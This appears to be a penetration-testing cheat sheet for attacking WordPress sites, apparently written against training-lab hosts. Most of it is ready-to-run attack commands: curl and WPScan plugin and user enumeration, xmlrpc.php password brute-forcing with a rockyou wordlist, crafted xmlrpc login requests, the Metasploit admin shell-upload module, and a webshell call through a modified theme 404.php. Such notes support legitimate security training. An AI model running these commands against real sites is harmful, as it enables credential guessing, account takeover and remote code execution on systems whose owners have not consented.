- Wp-login.php has username enumeration as a feature.
- Viewing the page for usernames
- Call to the API ≤ 4.7.1 WP ([http://blog.inlanefreight.com/wp-json/wp/v2/users](http://blog.inlanefreight.com/wp-json/wp/v2/users))

- [ ] Check robots.txt file may reveal /wp-admin page
- [ ] Identify if xmlrpc.php is enabled
- [ ] Automated WordPress Scanning
- [ ] Username Enumeration
- [ ] Login Brute-force
- [ ] Check wp-config.php file

(cURL) Plugin enumeration
```bash
curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'wp-content/plugins/*' | cut -d"'" -f2
```
(WPScan) Plugin scanning -> RCE
```bash
sudo wpscan --url http://blog.external.local --enumerate ap --api-token <API_TOKEN> -t 4 --plugins-detection mixed
```
(WPScan) Account Brute-forcing 
- wp-login
- xmlrpc.php: brute force the API (preferred because it’s faster)
```bash
wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
```
(cURL) Account Login (xmlrpc.php)
```bash
 curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php
```
(cURL) xmlrpc.php method listing
```bash
curl -s -X POST -d "<methodCall><methodName>system.listMethods</methodName></methodCall>" http://blog.inlanefreight.com/xmlrpc.php
```
(Admin) Appearance -> Theme editor -> RCE (PHP payload)
- Metasploit module
```bash
exploit/unix/webapp/wp_admin_shell_upload
```
RCE theme 404
```bash
/wp-content/themes/twentyseventeen/404.php?cmd=id
```